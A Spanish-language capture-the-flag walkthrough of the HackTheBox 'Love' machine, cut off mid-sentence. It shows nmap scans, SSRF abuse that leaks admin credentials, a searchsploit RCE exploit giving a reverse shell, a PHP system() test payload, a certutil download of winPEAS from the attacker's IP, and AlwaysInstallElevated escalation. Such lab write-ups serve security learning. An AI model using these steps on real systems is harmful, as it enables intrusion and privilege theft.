
# Enumeración

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.48.103 -oG allPorts
```

```shell

 [*] IP Address: 10.129.48.103
 [*] Open ports: 80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670
```

```shell
nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670 -sCV 10.129.48.103 -oN targeted
```


## 80
En el puerto 80 encontramos un panel de login de `Voting System`

```shell
nmap --script http-enum -p 80 10.129.48.103 -oN WebScan 
```

```shell
/admin/: Possible admin folder
/admin/index.php: Possible admin folder
/Admin/: Possible admin folder
/icons/: Potentially interesting folder w/ directory listing
/images/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
/includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
```

Encontramos un panel de login de `Admin`

También encontramos una web bajo el subdominio `staging.love.htb`
Al acceder a ella vemos que es un scanner de ficheros gratuito, en la sección de `Demo` podemos introducir una URL para que nos la escanee.

En nuestra maquina atacante levantamos un servidor con `python` y le pasamos la URL, viendo desde nuestro servidor que tramita una petición con `GET`

Creamos un archivo llamado `test` que contenga cualquier tipo de contenido y se lo volvemos a pasar al scaner

Una vez se lo hemos pasado vemos que el contenido que le hemos pasado lo refleja por pantalla, al ser una pagina `PHP` puede ser que interprete código `.php`

Así que en el archivo que habíamos creado le introducimos un
```php
<?php
    system("whoami");
?>
```

Y lo volvemos a pasar al scaner, sin recibir ninguna respuesta ya que no esta interpretando el código

En este caso estamos referenciando a archivos remotos pero podemos probar a pasarle el propio localhost de la maquina

Obteniendo como respuesta el panel de `login` de la web que se encuentra en `love.htb`, por lo cual se esta aconteciendo un `SSRF (Server Side Request Forgery)`, el cual se puede derivar en un `Internal Port Discovery`.

Ya que en el escaneo realizado con [[NMAP]] por ejemplo podemos encontarar en el puerto `5000` una web con `HTTP` y una respuesta de `Forbiden` se puede probar a ver el contenido de ese puerto desde el scaner

Llamándolo desde el scaner descubrimos el contenido de este puerto
![[Captura de pantalla 2026-02-18 163154.png]]

Obteniendo las credenciales
```ad-hint
admin::@LoveIsInTheAir!!!!
```

Pudiendo acceder como `Admin` al panel de administración del sistema de `Voting Sistem`

Vamos a buscar vulnerabilidades que pueda tener el sistema de `Voting System`, vamos a usar [[SEARCHSPLOIT]]
```shell
searchsploit "voting system"
```

Encontramos una vulnerabilidad llamada `Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)`, se nos indica un archivo `.py` con el cual podemos intentar explotar esta vulnerabilidad, nos los traemos a la maquina con
```shell
searchsploit "voting system" -m php/webapps/49445.py

```

### File Upload -> RCE

El exploit nos pide configurar los siguientes parámetros, así que con los datos obtenidos y poniéndonos en escucha con [[PENELOPE]] deberíamos de obtener una `Reverse Shell`

![[Pasted image 20260218165327.png]]

Además de modificar ese campo haremos un debuger de peticiones haciendo que todas las peticiones pases por [[BURPSUITE]]
![[Pasted image 20260218165454.png]]

Y deberemos de modificar las rutas de búsqueda para que queden tal que así
![[Pasted image 20260218165532.png]]

Pudiéndolo ejecutar ahora y obteniendo una shell en nuestro listener

Nos encontramos en un sistema `Windows`

# Enumeración Windows
Para realizar esta parte en Windows usaremos la herramienta [[WINPEAS]], nos lo pasamos a la maquina a la que hemos obtenido acceso usando
```shell
certutil.exe -f -urlcache -split http://10.10.14.79/winPEASx64.exe
```

Una vez en la maquina lo ejecutaremos, en la salida obtenida observamos

Encontramos `AlwaysInstallElevated` el cual esta seteado en `1` tanto en el `HKLM` y `HKCU`, nos podemos aprovechar de ellos para elevar privilegios
[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=AlwaysInstallElevated#alwaysinstallelevated]

Lo que nos permite tener estos dos registros acticvad
